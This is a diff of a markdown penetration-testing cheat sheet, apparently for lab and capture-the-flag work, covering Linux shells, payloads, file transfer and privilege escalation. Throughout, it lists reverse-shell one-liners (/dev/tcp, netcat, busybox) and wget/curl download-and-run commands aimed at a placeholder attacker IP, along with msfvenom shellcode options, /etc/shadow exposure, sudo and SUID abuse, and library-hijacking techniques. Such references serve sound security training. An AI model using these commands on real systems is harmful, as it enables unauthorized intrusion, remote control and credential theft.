@@ -6,16 +6,16 @@
 *   Shells & Payloads
     *   Metasploit
         *   `msfconsole` → `search [COMPONENT]` → `use [EXPLOIT]` → `options`
-        *   `set payload linux/[x86/X64]/shell/[bind/reverse]_tcp` → Also `meterpreter` instead of `shell`
+        *   `set payload linux/[x86/X64]/shell/[bind/reverse]_tcp` → Also `/meterpreter/` instead of `/shell/`
         *   `set payload linux/[x86/X64]/shell_[bind/reverse]_tcp`
     *   Web Shells
         *   `ls -la /usr/share/webshells` + [Public Repository](https://github.com/nicholasaleks/webshells)
-        *   ASP / ASPX / PHP / PL / RB / CFM / JSP / WAR (Tomcat)
+        *   ASP / ASPX / PHP / PL / RB / CFM / JSP / [WAR (Tomcat Manager Endpoints)](https://0xdf.gitlab.io/2020/11/07/htb-tabby.html)
     *   Bash / Netcat / Python3
         *   `sh -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1`
         *   `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|cmd -i 2>&1|nc [KALI_IP] [PORT] >/tmp/f` 
         *   `busybox nc [KALI_IP] [PORT] -e sh`
-        *   [Python Shortest](https://www.revshells.com/)
+        *   [Python3 Shortest](https://www.revshells.com/)
     *   CURL / WGET
         *   `wget -q -O - http://[KALI_IP]/[SCRIPT] | sh`
         *   `curl -s http://[KALI_IP]/[SCRIPT] | sh`
@@ -33,8 +33,9 @@
             *   WAR / JSP     → `-p java/shell_reverse_tcp -f war`
         *   BOF Shellcode
             *   `msfvenom -a [x86/x64] -p [SHELL_TYPE] -f [python/c] -b [BAD_CHARS] -e [ENCODER] -i 3 --smallest` 
-            *   Encoders         → `x86/shikata_ga_nai` / `x86/unicode_m`
-            *   Extra Options → `BufferRegister=EAX` / `Exitfunc=thread`
+            *   Encoders                → `x86/shikata_ga_nai` / `x86/unicode_m`
+            *   Extra Options        → `BufferRegister=EAX` / `Exitfunc=thread`
+            *   Default Badchars → `\x00\x0a\x0d`
     *   Bash Payloads
         *   `chmod u+s /bin/bash`       → `/bin/bash -p` → Give SUID to Shell [GTFOBin](https://gtfobins.github.io/)(`find` / Other)
         *   `chmod 777 /etc/shadow`   → Hash Cracking
@@ -44,9 +45,6 @@
             *   `usermod [USER] --password $(echo [PASS] | openssl passwd -1 -stdin)`
         *   Set Group Membership
             *   `usermod -aG [GROUP] [USER]` → `sudo` Group / Alternative
-    *   Python File Payload
-        *   `import os`
-        *   `os.system("[BASH_PAYLOAD]")`
 *   File Transfers
     *   Writable Directories
         *   `/var/tmp`
@@ -92,8 +90,12 @@
             *   Password Re-Use
     *   Shells
         *   TTY Upgrade
-            *   `python -c 'import pty; pty.spawn("/bin/bash")'` / `script /dev/null -c bash`
-            *   CTRL+Z → `stty raw -echo; fg` → `screen`
+            *   `python -c 'import pty; pty.spawn("/bin/bash")'` 
+            *   `script /dev/null -c bash`
+            *   Follow-up
+                *   CTRL+Z
+                *   `stty raw -echo; fg`
+                *   `reset` → Input `screen`
         *   Jail Escape
             *   RBash / Limited Shell → `ssh [AUTH] -t bash` / [Auto-Completion](https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html) / GTFOBin → `echo $PATH` / `help` / `?`
             *   `ls -la /.dockerenv`    → [Docker Breakouts](https://juggernaut-sec.com/docker-breakout-lpe/) + `capsh --print` + Disk Access → `df -h`
@@ -103,6 +105,9 @@
         *   Outdated Screen / Bash 
             *   `bash --version`
             *   `screen --version`
+        *   EOF Writing
+            *   `cat > [OUT]<<EOF`
+            *   Write Line-by-Line → End file with `EOF`
     *   SUDO
         *   Misconfigurations
             *   `sudo -V`                                                        → Version `<1.8.28` → `sudo -u#-1 /bin/bash`
@@ -110,7 +115,7 @@
             *   `ls -la /var/run/sudo/ts/$(whoami)`   → [Writable](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#etc-sudoers-etc-sudoers.d) → `write_sudo_token [SHELL_PID] [SUDO/TS/FILE]`
         *   Exploitation
             *   `sudo -l` 
-            *   GTFOBin Escape / Exploit Research → Interesting & Uncommon Names
+            *   GTFOBin Escape
             *   User Impersonation      → `(ALL, !root) [SHELL_ESCAPE_BINARY]` → `sudo -u [USER] [SHELL_ESCAPE]`
             *   SO Injection                     → `LD_PRELOAD` / `LD_LIBRARY_PATH`
             *   PATH Hijacking               → Missing `secure_path` / `SETENV` / `PYTHONPATH`
@@ -119,7 +124,7 @@
             *   LDD PATH Hijacking     → `ldd [BINARY]` / Writable `/etc/ld.so.conf.d` + `/etc/ld.so.conf`
             *   Bash Scripts                     → Writable File / Argument Injections / [Wildcards](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html) / Vulnerable Binary / Unquoted Comparison `""`
             *   Python Scripts                → Writable File / Vulnerable Library / Library `sys.path` Hijacking / Argument Injections / [Wildcards](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html)
-            *   Custom Binaries            → RE Analysis (Ghidra) / Local & [Remote](https://gist.github.com/Reodus/153373b38b7b54b3e3034cb14122f18a) BOF / MD5SUM VirusTotal Check / Filetype & Metadata
+            *   Custom                             → RE Analysis (Ghidra) / Local & [Remote](https://gist.github.com/Reodus/153373b38b7b54b3e3034cb14122f18a) BOF / ChatGPT Script Analysis / Filetype & Metadata
     *   Cronjobs
         *   Enumeration
             *   `ls -la /etc/cron* /var/spool/`
@@ -131,6 +136,7 @@
             *   LDD PATH Hijacking    → `ldd [BINARY]` / Writable `/etc/ld.so.conf.d` + `/etc/ld.so.conf`
             *   Bash Scripts                    → Writable File / Argument Injections / [Wildcards](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html) / Vulnerable Binary / Unquoted Comparison `""`
             *   Python Scripts               → Writable File / Vulnerable Library / Library `sys.path` Hijacking / Argument Injections / [Wildcards](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html)
+            *   Custom                            → RE Analysis (Ghidra) / Local & [Remote](https://gist.github.com/Reodus/153373b38b7b54b3e3034cb14122f18a) BOF / ChatGPT Script Analysis / Filetype & Metadata
         *   Timers
             *   `find / -type f -iname "*.timer"` → Check associated `.service` in `[Unit]` section
             *   Writable ExecStart / Binary / Script
@@ -150,7 +156,7 @@
             *   Filenames    → `find / -type f -iname "[STRING]" 2>/dev/null` → `db` / `database` / `conf` / `settings` / `cred` / `pass`
             *   Contents      → `grep -rniH "[STRING]" [PATH] [-e REGEX]`
         *   Web Applications
-            *   Web Roots       → `/var/www/`, `/srv/http/`, `/usr/local`, `/opt`, `/app`
+            *   Web Roots       → `/var/www`, `/srv`, `/opt`
             *   Virtual Hosts    → `default`, `000-default.conf`
             *   Log Files            → `[access/error].log`, `httpd-[access/error].log`, `httpd.conf`
             *   DB Files             → `*[db/database/settings/config].*`, `/var/db/*`, `*.db`, `.sql*`
@@ -216,10 +222,10 @@
         *   [CVE-2023-0386](https://github.com/xkaneiki/CVE-2023-0386) (Ubuntu 22.04 - 5.15.x)
         *   DMESG Signature EOP → `dmesg 2>/dev/null | grep "signature"` → [Exploitation](https://0xdf.gitlab.io/2019/12/14/htb-smasher2.html)
     *   SUID / CAP Binaries
-        *   `find / -perm -4000 2>/dev/null`
+        *   `find / -perm -4000 2>/dev/null` → Non-Default / SUID3Enum / WinPEAS
         *   `getcap -r / 2>/dev/null`
         *   Exploitation
-            *   GTFOBin Escape / Exploit Research → Interesting & Uncommon Names
+            *   GTFOBin Escape
             *   PATH Hijacking               → Relative/Current Paths + `strings` 
             *   [Function Hijacking](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#suid-binary-with-command-path)      → Absolute Binary Paths
             *   SO Injection                     → `strace [BINARY] 2>&1 | grep -i -E "open|access|no such file"`
@@ -227,7 +233,7 @@
             *   LDD PATH Hijacking     → `ldd [BINARY]` / Writable `/etc/ld.so.conf.d` + `/etc/ld.so.conf`
             *   Bash Scripts                     → Writable File / Argument Injections / [Wildcards](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html) / Vulnerable Binary / Unquoted Comparison `""`
             *   Python Scripts                → Writable File / Vulnerable Library / Library `sys.path` Hijacking / Argument Injections / [Wildcards](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html)
-            *   Custom Binaries            → RE Analysis (Ghidra) / Local & [Remote](https://gist.github.com/Reodus/153373b38b7b54b3e3034cb14122f18a) BOF / MD5SUM VirusTotal Check / Filetype & Metadata
+            *   Custom                             → RE Analysis (Ghidra) / Local & [Remote](https://gist.github.com/Reodus/153373b38b7b54b3e3034cb14122f18a) BOF / ChatGPT Script Analysis / Filetype & Metadata
     *   Processes
         *   `ps -aux | grep [root/username]`
         *   `pspy -pf -i 1000` → Process Spying
@@ -239,12 +245,13 @@
             *   Memory Dumping
     *   Network 
         *   Local Services 
-            *   `netstat -puntal`       → Localhost / Intranet IPs
+            *   `netstat -puntal`       → `127.0.0.1` / Intranet IPs
+            *   Associated Process  → `ps -p [SERVICE_PID] -o command` → Check Privilege / Process String
             *   Configuration Files  → All Services + Permissions
             *   DB Access                  → Data Dumping / Blank Password / [UDF Escalation](https://juggernaut-sec.com/mysql-user-defined-functions/)
             *   Local Forwarding
         *   [Dynamic Forwarding](https://notes.dollarboysushil.com/pivoting-and-tunneling/ligolo-ng)
-            *   `ifconfig` / `ip route`
+            *   `ifconfig` / `ip route` → Ligolo Tunnel
             *   Local Sweep
                 *   Valid for `/24` → Adjust Accordingly
                 *   `for i in {1..255} ;do (ping -c 1 [INTRANET_CIDR_BLOCK].$i | grep "bytes from"|cut -d ' ' -`  
